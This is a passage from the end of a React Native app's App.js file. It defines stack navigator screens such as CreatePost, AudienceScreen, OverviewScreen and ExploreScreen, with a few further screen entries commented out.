          name="CreatePost"
          component={CreatePost}
        />
        <Stack.Screen
          options={{ headerShown: false }}
          name="AudienceScreen"
          component={AudienceScreen}
        />
        <Stack.Screen
          options={{ headerShown: false }}
          name="OverviewScreen"
          component={OverviewScreen}
        />
        <Stack.Screen
          options={{ headerShown: false }}
          name="ExploreScreen"
          component={ExploreScreen}
        />
        {/* <Stack.Screen name="PushNotifyScreen" component={PushNotifyScreen} />
      <Stack.Screen name="SocialAuthScreen" component={SocialAuthScreen} />
      <Stack.Screen name="MainScreen" component={MainScreen} />
      <Stack.Screen name="LoadScreen" componentt={LoadScreen} /> */}
      </Stack.Navigator>
    </NavigationContainer>
  );
}
export default App;
